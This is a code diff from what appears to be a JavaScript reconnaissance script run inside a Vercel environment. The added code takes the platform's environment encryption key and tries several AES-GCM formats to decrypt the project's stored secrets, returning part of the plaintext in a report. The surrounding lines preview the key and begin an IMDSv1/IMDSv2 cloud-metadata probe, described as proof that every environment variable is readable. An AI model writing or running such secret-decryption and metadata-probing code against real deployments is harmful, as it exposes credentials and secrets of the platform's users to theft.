@@ -41,20 +41,39 @@ const report = {
   envEncKeyPreview: safe(() => process.env.VERCEL_ENV_ENC_KEY
     ? `${process.env.VERCEL_ENV_ENC_KEY.slice(0,8)}...` : "absent"),
   // Attempt AES-256-GCM decryption of project secrets — proof that all env vars are readable
+  // Tries multiple formats since the exact Vercel scheme is inferred, not documented
   decryptedEnvPreview: safe(() => {
     const key = process.env.VERCEL_ENV_ENC_KEY;
     const content = process.env.VERCEL_ENCRYPTED_ENV_CONTENT;
     if (!key || !content) return "missing-key-or-content";
     const raw = Buffer.from(content, 'base64');
-    if (raw.length < 28) return `too-short(${raw.length})`;
     const keyBuf = Buffer.from(key, 'base64');
-    const nonce = raw.slice(0, 12);
-    const tag = raw.slice(raw.length - 16);
-    const ciphertext = raw.slice(12, raw.length - 16);
-    const decipher = createDecipheriv('aes-256-gcm', keyBuf, nonce);
-    decipher.setAuthTag(tag);
-    const plaintext = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
-    return `DECRYPTED(${plaintext.length}bytes): ${plaintext.toString('utf8').slice(0,400)}`;
+    const diagnostics = `raw=${raw.length}b key=${keyBuf.length}b`;
+    // Check if content could be JSON (some Vercel internals use JSON envelope)
+    try {
+      const jsonStr = raw.toString('utf8');
+      if (jsonStr.startsWith('{')) {
+        const parsed = JSON.parse(jsonStr);
+        return `JSON-envelope: ${JSON.stringify(Object.keys(parsed)).slice(0,100)}`;
+      }
+    } catch (_) {}
+    // Try format: nonce(12) + ciphertext + tag(16) — standard GCM
+    const tryGCM = (nLen) => {
+      try {
+        if (raw.length < nLen + 16 + 1) return null;
+        const useKey = keyBuf.length === 32 ? keyBuf : keyBuf.slice(0, 32);
+        const nonce = raw.slice(0, nLen);
+        const tag = raw.slice(raw.length - 16);
+        const ct = raw.slice(nLen, raw.length - 16);
+        const d = createDecipheriv('aes-256-gcm', useKey, nonce);
+        d.setAuthTag(tag);
+        const pt = Buffer.concat([d.update(ct), d.final()]);
+        return `GCM-nonce${nLen}: DECRYPTED(${pt.length}b): ${pt.toString('utf8').slice(0,300)}`;
+      } catch (e) { return `GCM-nonce${nLen}-ERR: ${e.message.slice(0,80)}`; }
+    };
+    const r12 = tryGCM(12);
+    const r16 = tryGCM(16);
+    return `${diagnostics} | ${r12} | ${r16}`;
   }),
   // egress sanity + cloud-metadata reachability (IMDSv1 + IMDSv2 probe)
   imds: safe(() => {
